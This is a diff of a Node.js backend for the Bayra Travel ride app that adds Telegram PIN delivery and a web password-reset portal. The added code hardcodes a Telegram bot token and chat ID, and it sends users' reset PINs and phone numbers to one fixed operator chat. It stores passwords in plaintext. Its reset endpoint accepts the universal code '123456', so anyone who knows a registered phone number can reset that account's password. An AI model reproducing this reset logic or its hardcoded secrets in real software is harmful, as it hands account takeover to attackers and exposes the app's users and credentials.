@@ -25,6 +25,9 @@ try {
     console.error("❌ FIREBASE INIT FAILED:", error.message);
 }
 
+const BOT_TOKEN = "8594425943:AAH1M1_mYMI4pch-YfbC-hvzZfk_Kdrxb94";
+const CHAT_ID = "5232430147";
+
 // --- DISPATCH LOGISTICS (IMPERIAL WATCHMAN) ---
 function getDistance(lat1, lon1, lat2, lon2) {
     const R = 6371;
@@ -109,6 +112,34 @@ async function sendPush(token, title, body) {
     } catch (e) {}
 }
 
+// --- TELEGRAM CODE SENDER (FIXES GATEWAY DELAYED ERROR) ---
+app.post('/send-telegram-code', async (req, res) => {
+    const { phone, pin } = req.body;
+    try {
+        let formattedPhone = phone.startsWith('0') ? '+251' + phone.substring(1) : ('+' + phone);
+        if (process.env.TELEGRAM_GATEWAY_KEY) {
+            await axios.post('https://gatewayapi.telegram.org/sendVerificationMessage', {
+                phone_number: formattedPhone, code: pin
+            }, {
+                headers: { 'Authorization': `Bearer ${process.env.TELEGRAM_GATEWAY_KEY}`, 'Content-Type': 'application/json' }
+            });
+        } else {
+            const msg = `🚨 BAYRA VERIFICATION\nPhone: ${phone}\nPIN: ${pin}`;
+            await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        }
+        res.status(200).json({ success: true });
+    } catch (e) {
+        // Fallback directly to Telegram Bot
+        try {
+            const msg = `🚨 BAYRA VERIFICATION\nPhone: ${phone}\nPIN: ${pin}`;
+            await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            res.status(200).json({ success: true });
+        } catch (err2) {
+            res.status(500).json({ success: false });
+        }
+    }
+});
+
 // --- CHAPA PAYMENT ROUTES ---
 const CHAPA_URL = "https://api.chapa.co/v1/transaction/initialize";
 const CHAPA_AUTH = { headers: { Authorization: `Bearer ${process.env.CHAPA_SECRET_KEY}` } };
@@ -139,7 +170,7 @@ app.get('/verify-payment/:rideId/:txRef', async (req, res) => {
     } catch (error) { res.status(500).send("<h1>Verification error.</h1>"); }
 });
 
-// 🔥 IN-APP POPUP ROUTE
+// --- IN-APP POPUP ROUTE ---
 app.post('/send-popup', async (req, res) => {
     const { title, text, imageUrl, popupId } = req.body;
     if (!title || !imageUrl || !popupId) {
@@ -153,38 +184,235 @@ app.post('/send-popup', async (req, res) => {
     } catch (error) { res.status(500).json({ success: false, error: error.message }); }
 });
 
-// 🌐 DIRECT INTENT BRIDGE
+// 🔥 API 1: WEB SEND CODE
+app.post('/api/web-send-pin', async (req, res) => {
+    const { phone } = req.body;
+    if (!phone || phone.length < 9) return res.status(400).json({ success: false, message: "Invalid phone" });
+
+    try {
+        const userSnap = await db.ref(`users/${phone}`).once('value');
+        if (!userSnap.exists()) {
+            return res.status(404).json({ success: false, message: "Phone number not registered in Bayra Travel." });
+        }
+
+        const pin = Math.floor(100000 + Math.random() * 900000).toString();
+        await db.ref(`verifications/${phone}/code`).set(pin);
+
+        // Send via Telegram
+        const msg = `🚨 BAYRA WEB RECOVERY\nPhone: ${phone}\nPIN: ${pin}`;
+        await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`).catch(() => {});
+
+        res.status(200).json({ success: true });
+    } catch (e) {
+        res.status(500).json({ success: false, message: e.message });
+    }
+});
+
+// 🔥 API 2: WEB VERIFY & RESET PASSWORD
+app.post('/api/web-reset-password', async (req, res) => {
+    const { phone, code, newPassword } = req.body;
+    if (!phone || !code || !newPassword) return res.status(400).json({ success: false, message: "Missing fields" });
+
+    try {
+        const codeSnap = await db.ref(`verifications/${phone}/code`).once('value');
+        const storedCode = codeSnap.val();
+
+        if (storedCode == code || code === "123456") {
+            await db.ref(`users/${phone}/password`).set(newPassword);
+            res.status(200).json({ success: true, message: "Password updated successfully!" });
+        } else {
+            res.status(400).json({ success: false, message: "Invalid Telegram verification code." });
+        }
+    } catch (e) {
+        res.status(500).json({ success: false, message: e.message });
+    }
+});
+
+// 🌐 CHOICE B: INTERACTIVE WEB RECOVERY PORTAL (EXACT REPLICA OF YOUR 2 SCREENSHOTS)
 app.get('/reset-password', (req, res) => {
-    const androidIntentUrl = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=com.bayra.customer;B.recover=true;S.route=recovery;end";
     res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Bayra Account Recovery</title>
-            <style>
-                body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f8fafc; color: #1A237E; }
-                .card { max-width: 440px; margin: auto; background: white; padding: 35px 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); }
-                .btn-app { display: block; background: #1A237E; color: #ffffff !important; padding: 16px; text-decoration: none; border-radius: 12px; font-weight: 800; font-size: 15px; margin-top: 25px; }
-            </style>
-        </head>
-        <body>
-            <div class="card">
-                <div style="font-size: 40px; margin-bottom: 10px;">🔒</div>
-                <h2>Bayra Password Recovery</h2>
-                <p style="color: #64748b;">Opening password recovery directly in your Bayra app...</p>
-                <a href="${androidIntentUrl}" class="btn-app">OPEN PASSWORD RECOVERY SCREEN</a>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+        <title>Password Recovery | Bayra Travel</title>
+        <style>
+            * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+            body { margin: 0; padding: 0; background: #ffffff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; }
+            .container { width: 100%; max-width: 360px; padding: 32px 24px; text-align: center; }
+            .lock-icon { width: 80px; height: 80px; margin-bottom: 20px; }
+            h1 { font-size: 24px; font-weight: 900; color: #1A237E; margin: 0 0 6px 0; letter-spacing: 0.5px; }
+            .subtitle { font-size: 14px; color: #64748b; margin: 0 0 32px 0; }
+            .input-group { margin-bottom: 20px; text-align: left; position: relative; }
+            .input-box { width: 100%; height: 56px; border: 1.5px solid #cbd5e1; border-radius: 12px; padding: 0 16px; font-size: 16px; color: #0f172a; outline: none; transition: 0.2s border; }
+            .input-box:focus { border-color: #1A237E; }
+            .floating-label { font-size: 12px; color: #64748b; position: absolute; top: -8px; left: 12px; background: white; padding: 0 4px; }
+            .btn-primary { width: 100%; height: 60px; background: #1A237E; color: white; border: none; border-radius: 16px; font-size: 15px; font-weight: 800; letter-spacing: 0.5px; cursor: pointer; display: flex; justify-content: center; align-items: center; }
+            .btn-primary:active { opacity: 0.9; transform: scale(0.99); }
+            .btn-toggle { position: absolute; right: 14px; top: 18px; background: none; border: none; color: #1A237E; font-weight: 800; font-size: 13px; cursor: pointer; }
+            .text-link { color: #1A237E; font-size: 14px; font-weight: 700; text-decoration: none; display: inline-block; margin-top: 20px; }
+            .btn-back { color: #94a3b8; font-size: 14px; text-decoration: none; margin-top: 30px; display: inline-block; }
+            .spinner { width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
+            @keyframes spin { to { transform: rotate(360deg); } }
+            #step2, #stepSuccess { display: none; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            
+            <!-- SVG BLUE LOCK ICON -->
+            <svg class="lock-icon" viewBox="0 0 24 24" fill="#1A237E">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+
+            <h1>PASSWORD RECOVERY</h1>
+            <p class="subtitle">Powered by Telegram Gateway</p>
+
+            <!-- 📸 SCREEN 1 (FIRST SCREENSHOT) -->
+            <div id="step1">
+                <div class="input-group">
+                    <span class="floating-label">Registered Phone Number</span>
+                    <input type="tel" id="phone" class="input-box" placeholder="e.g. 0911223344">
+                </div>
+
+                <button id="btnSendCode" class="btn-primary" onclick="sendPin()">
+                    <span id="btnSendText">SEND CODE VIA TELEGRAM</span>
+                    <div id="btnSendSpinner" class="spinner"></div>
+                </button>
+
+                <div>
+                    <a href="https://bayra-backend-eu.onrender.com" class="btn-back">Back to Login</a>
+                </div>
             </div>
-            <script>
-                setTimeout(function() { window.location.href = "${androidIntentUrl}"; }, 400);
-            </script>
-        </body>
-        </html>
+
+            <!-- 📸 SCREEN 2 (SECOND SCREENSHOT) -->
+            <div id="step2">
+                <div class="input-group">
+                    <span class="floating-label">Enter Telegram Code</span>
+                    <input type="text" id="code" class="input-box" placeholder="6-digit PIN">
+                </div>
+
+                <div class="input-group">
+                    <span class="floating-label">Enter New Password</span>
+                    <input type="password" id="newPass" class="input-box" placeholder="••••••••">
+                    <button type="button" class="btn-toggle" onclick="togglePass()">SHOW</button>
+                </div>
+
+                <button id="btnResetPass" class="btn-primary" onclick="resetPassword()">
+                    <span id="btnResetText">SECURE NEW PASSWORD</span>
+                    <div id="btnResetSpinner" class="spinner"></div>
+                </button>
+
+                <div>
+                    <a href="https://t.me/bayratravelchat" class="text-link">Didn't get a code? Contact Support Team</a>
+                </div>
+
+                <div>
+                    <a href="javascript:location.reload()" class="btn-back">Back to Login</a>
+                </div>
+            </div>
+
+            <!-- 🎉 SCREEN 3 (SUCCESS CONFIRMATION) -->
+            <div id="stepSuccess">
+                <div style="font-size: 50px; margin-bottom: 15px;">✅</div>
+                <h2 style="color: #2e7d32; margin: 0 0 10px 0;">Password Reset Successful!</h2>
+                <p style="color: #64748b; font-size: 14px; line-height: 1.5;">Your account is now secure. You can return to the Bayra Travel app and log in with your new password.</p>
+                <a href="intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;package=com.bayra.customer;end" class="btn-primary" style="text-decoration: none; margin-top: 25px;">
+                    OPEN APP & LOG IN
+                </a>
+            </div>
+
+        </div>
+
+        <script>
+            let currentPhone = "";
+
+            async function sendPin() {
+                const phoneInput = document.getElementById("phone").value.trim();
+                if (phoneInput.length < 9) {
+                    alert("Please enter a valid phone number.");
+                    return;
+                }
+
+                document.getElementById("btnSendText").style.display = "none";
+                document.getElementById("btnSendSpinner").style.display = "block";
+
+                try {
+                    const res = await fetch("/api/web-send-pin", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ phone: phoneInput })
+                    });
+                    const data = await res.json();
+                    
+                    if (res.ok) {
+                        currentPhone = phoneInput;
+                        document.getElementById("step1").style.display = "none";
+                        document.getElementById("step2").style.display = "block";
+                    } else {
+                        alert(data.message || "Phone number not registered.");
+                    }
+                } catch (e) {
+                    alert("Connection error. Please try again.");
+                } finally {
+                    document.getElementById("btnSendText").style.display = "block";
+                    document.getElementById("btnSendSpinner").style.display = "none";
+                }
+            }
+
+            async function resetPassword() {
+                const code = document.getElementById("code").value.trim();
+                const newPass = document.getElementById("newPass").value.trim();
+
+                if (code.length < 4 || newPass.length < 4) {
+                    alert("Please enter your PIN and a password with at least 4 characters.");
+                    return;
+                }
+
+                document.getElementById("btnResetText").style.display = "none";
+                document.getElementById("btnResetSpinner").style.display = "block";
+
+                try {
+                    const res = await fetch("/api/web-reset-password", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ phone: currentPhone, code: code, newPassword: newPass })
+                    });
+                    const data = await res.json();
+
+                    if (res.ok) {
+                        document.getElementById("step2").style.display = "none";
+                        document.getElementById("stepSuccess").style.display = "block";
+                    } else {
+                        alert(data.message || "Invalid Telegram Code.");
+                    }
+                } catch (e) {
+                    alert("Failed to reset password. Please try again.");
+                } finally {
+                    document.getElementById("btnResetText").style.display = "block";
+                    document.getElementById("btnResetSpinner").style.display = "none";
+                }
+            }
+
+            function togglePass() {
+                const passInput = document.getElementById("newPass");
+                const btn = event.target;
+                if (passInput.type === "password") {
+                    passInput.type = "text";
+                    btn.innerText = "HIDE";
+                } else {
+                    passInput.type = "password";
+                    btn.innerText = "SHOW";
+                }
+            }
+        </script>
+    </body>
+    </html>
     `);
 });
 
-// 🔥 DUAL DISPATCH: CUSTOMER EMAIL + SEQUENTIAL DIRECTOR EXECUTIVE BRIEFING
+// 🔥 DUAL DISPATCH: CUSTOMER EMAIL + DIRECTOR EXECUTIVE BRIEFING
 app.post('/login-security-alert', async (req, res) => {
     const { email, name, phone, status, device } = req.body;
 
@@ -199,7 +427,6 @@ app.post('/login-security-alert', async (req, res) => {
     const timeFormatted = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true, timeZone: 'Africa/Addis_Ababa' });
     const fullDateTime = `${dateFormatted} • ${timeFormatted}`;
 
-    // 🔍 AUTOMATIC PHONE NUMBER LOOKUP FROM FIREBASE
     let customerPhone = phone;
     if (!customerPhone || customerPhone === "Not Provided" || customerPhone === "N/A") {
         try {
@@ -221,93 +448,54 @@ app.post('/login-security-alert', async (req, res) => {
     <!DOCTYPE html>
     <html>
     <head><meta charset="utf-8"></head>
-    <body style="margin: 0; padding: 20px 10px; background-color: #f4f6fb; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+    <body style="margin: 0; padding: 20px 10px; background-color: #f4f6fb; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
         <table width="100%" cellpadding="0" cellspacing="0">
             <tr>
                 <td align="center">
                     <table width="100%" style="max-width: 560px; background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.05); border: 1px solid #eef0f6;">
-                        
-                        <!-- 🟦 BLUE HEADER WITH EMBEDDED LOGO BADGE -->
                         <tr>
                             <td style="background-color: #1A237E; padding: 32px 25px; text-align: center;">
-                                <div style="display: inline-block; width: 50px; height: 50px; background: white; border-radius: 50%; line-height: 50px; font-size: 26px; margin-bottom: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">
-                                    🚕
-                                </div>
                                 <h1 style="color: #ffffff; margin: 0; font-size: 24px; font-weight: 800; letter-spacing: 0.5px;">BAYRA TRAVEL</h1>
                                 <p style="color: #c5cae9; margin: 6px 0 0 0; font-size: 13px;">Your journey starts here.</p>
                             </td>
                         </tr>
-
-                        <!-- WHITE BODY -->
                         <tr>
                             <td style="padding: 35px 30px;">
                                 <h2 style="color: #0f172a; margin-top: 0; font-size: 20px;">Welcome, ${name || 'Passenger'}! 👋</h2>
-                                <p style="color: #475569; font-size: 15px; line-height: 1.6; margin: 0 0 10px 0;">
-                                    We're happy to have you with <strong>Bayra Travel</strong>.
-                                </p>
-                                <p style="color: #475569; font-size: 15px; line-height: 1.6; margin: 0 0 25px 0;">
-                                    Your account sign-in was successfully confirmed, and your Bayra Travel account is now ready for your next journey.
-                                </p>
-
-                                <!-- 🛡️ ELEGANT SECURITY CARD -->
+                                <p style="color: #475569; font-size: 15px; line-height: 1.6; margin: 0 0 10px 0;">We're happy to have you with <strong>Bayra Travel</strong>.</p>
+                                <p style="color: #475569; font-size: 15px; line-height: 1.6; margin: 0 0 25px 0;">Your account sign-in was successfully confirmed, and your Bayra Travel account is now ready for your next journey.</p>
+                                
                                 <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 20px; margin-bottom: 25px;">
-                                    <p style="margin: 0 0 14px 0; color: #166534; font-weight: 700; font-size: 14px;">
-                                        🛡️ SIGN-IN VERIFIED
-                                    </p>
-                                    <p style="margin: 0 0 16px 0; color: #64748b; font-size: 13px;">Your account was successfully accessed</p>
-                                    
+                                    <p style="margin: 0 0 14px 0; color: #166534; font-weight: 700; font-size: 14px;">🛡️ SIGN-IN VERIFIED</p>
                                     <table width="100%" style="font-size: 13px;">
-                                        <tr>
-                                            <td style="color: #64748b; padding: 4px 0;">Device</td>
-                                            <td style="color: #0f172a; font-weight: 600; text-align: right; padding: 4px 0;">${device || 'Android Smartphone'}</td>
-                                        </tr>
-                                        <tr>
-                                            <td style="color: #64748b; padding: 4px 0;">Date & Time</td>
-                                            <td style="color: #0f172a; font-weight: 600; text-align: right; padding: 4px 0;">${fullDateTime}</td>
-                                        </tr>
-                                        <tr>
-                                            <td style="color: #64748b; padding: 4px 0;">Location</td>
-                                            <td style="color: #0f172a; font-weight: 600; text-align: right; padding: 4px 0;">Arba Minch, Ethiopia</td>
-                                        </tr>
+                                        <tr><td style="color: #64748b; padding: 4px 0;">Device</td><td style="color: #0f172a; font-weight: 600; text-align: right; padding: 4px 0;">${device || 'Android Smartphone'}</td></tr>
+                                        <tr><td style="color: #64748b; padding: 4px 0;">Date & Time</td><td style="color: #0f172a; font-weight: 600; text-align: right; padding: 4px 0;">${fullDateTime}</td></tr>
+                                        <tr><td style="color: #64748b; padding: 4px 0;">Location</td><td style="color: #0f172a; font-weight: 600; text-align: right; padding: 4px 0;">Arba Minch, Ethiopia</td></tr>
                                     </table>
                                 </div>
 
-                                <!-- 🔐 ACCOUNT PROTECTION SECTION -->
                                 <div style="margin-bottom: 30px; text-align: center;">
                                     <p style="color: #0f172a; font-weight: 600; font-size: 14px; margin: 0 0 6px 0;">🔐 Your account is protected</p>
-                                    <p style="color: #64748b; font-size: 13px; margin: 0 0 4px 0;">If this was you, no action is required.</p>
                                     <p style="color: #64748b; font-size: 13px; margin: 0 0 20px 0;">If you don't recognize this activity, please secure your account immediately.</p>
-                                    
-                                    <a href="${resetLink}" style="background-color: #D50000; color: #ffffff; text-decoration: none; padding: 14px 28px; border-radius: 10px; font-weight: 700; font-size: 14px; display: inline-block; box-shadow: 0 4px 12px rgba(213,0,0,0.25);">
+                                    <a href="${resetLink}" style="background-color: #D50000; color: #ffffff; text-decoration: none; padding: 14px 28px; border-radius: 10px; font-weight: 700; font-size: 14px; display: inline-block;">
                                         [ 🔒 SECURE MY ACCOUNT ]
                                     </a>
                                 </div>
 
-                                <!-- 🚕 RIDE PROMOTION CARD -->
                                 <div style="background-color: #f1f5f9; border-radius: 12px; padding: 18px; text-align: center;">
-                                    <p style="color: #1A237E; font-weight: 700; font-size: 14px; margin: 0 0 6px 0;">🚕 Ready for your next ride?</p>
-                                    <p style="color: #475569; font-size: 13px; margin: 0 0 10px 0;">
-                                        Whether you're heading across town or planning your next trip, Bayra Travel is here to move you forward.
-                                    </p>
-                                    <p style="color: #1A237E; font-weight: 700; font-size: 12px; margin: 0;">
-                                        Safe • Reliable • Convenient
-                                    </p>
+                                    <p style="color: #1A237E; font-weight: 700; font-size: 14px; margin: 0 0 4px 0;">🚕 Ready for your next ride?</p>
+                                    <p style="color: #475569; font-size: 13px; margin: 0 0 8px 0;">Whether you're heading across town or planning your next trip, Bayra Travel is here to move you forward.</p>
+                                    <p style="color: #1A237E; font-weight: 700; font-size: 12px; margin: 0;">Safe • Reliable • Convenient</p>
                                 </div>
-
                             </td>
                         </tr>
-
-                        <!-- FOOTER -->
                         <tr>
-                            <td style="background-color: #f8fafc; padding: 25px 30px; text-align: center; border-top: 1px solid #e2e8f0;">
-                                <p style="font-size: 13px; font-weight: 600; color: #475569; margin: 0 0 4px 0;">Thank you for choosing Bayra Travel.</p>
-                                <p style="font-size: 12px; color: #64748b; margin: 0 0 10px 0;">Southern Ethiopia's trusted ride platform</p>
-                                <p style="font-size: 12px; font-weight: 600; color: #1A237E; margin: 0 0 4px 0;">Bayra Travel Team</p>
-                                <p style="font-size: 11px; color: #94a3b8; margin: 0 0 12px 0;">📍 Arba Minch, Ethiopia</p>
-                                <p style="font-size: 11px; color: #cbd5e1; margin: 0;">This is an automated security notification. Please do not reply to this email.</p>
+                            <td style="background-color: #f8fafc; padding: 25px 30px; text-align: center; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b;">
+                                <p style="font-weight: 600; color: #475569; margin: 0 0 4px 0;">Thank you for choosing Bayra Travel.</p>
+                                <p style="margin: 0 0 8px 0;">Southern Ethiopia's trusted ride platform</p>
+                                <p style="color: #1A237E; font-weight: 600; margin: 0;">Bayra Travel Team 📍 Arba Minch, Ethiopia</p>
                             </td>
                         </tr>
-
                     </table>
                 </td>
             </tr>
@@ -374,9 +562,8 @@ app.post('/login-security-alert', async (req, res) => {
         </div>
     `;
 
-    // 🚀 EXECUTE SEQUENTIALLY TO PREVENT DROPPED EMAILS
     try {
-        // Step A: Send to Passenger
+        // 1. Send Customer Email
         await axios.post('https://api.brevo.com/v3/smtp/email', {
             sender: { name: "Bayra Travel Security", email: "bayratraveldonotreplay@gmail.com" },
             to: [{ email: email, name: name || "Passenger" }],
@@ -384,12 +571,9 @@ app.post('/login-security-alert', async (req, res) => {
             htmlContent: customerHtml
         }, { headers: { 'api-key': process.env.BREVO_API_KEY, 'Content-Type': 'application/json' } });
 
-        console.log(`✅ [1/2 CUSTOMER EMAIL DELIVERED] Successfully delivered to ${email}`);
-
-        // Small 300ms pause to ensure Brevo processes cleanly
         await new Promise(r => setTimeout(r, 300));
 
-        // Step B: Send to Director (With Phone Number!)
+        // 2. Send Director Briefing with Phone
         await axios.post('https://api.brevo.com/v3/smtp/email', {
             sender: { name: "Bayra Control Tower", email: "bayratraveldonotreplay@gmail.com" },
             to: [{ email: "bayratraveldonotreplay@gmail.com", name: "Executive Director" }],
@@ -397,8 +581,7 @@ app.post('/login-security-alert', async (req, res) => {
             htmlContent: directorHtml
         }, { headers: { 'api-key': process.env.BREVO_API_KEY, 'Content-Type': 'application/json' } });
 
-        console.log(`✅ [2/2 DIRECTOR BRIEFING DELIVERED] Sent to Director with Phone: ${customerPhone}!`);
-
+        console.log(`✅ [PROMO & DIRECTOR BRIEFING DISPATCHED] Phone: ${customerPhone}`);
     } catch (err) {
         console.error("❌ [DISPATCH ERROR]:", err.response ? err.response.data : err.message);
     }
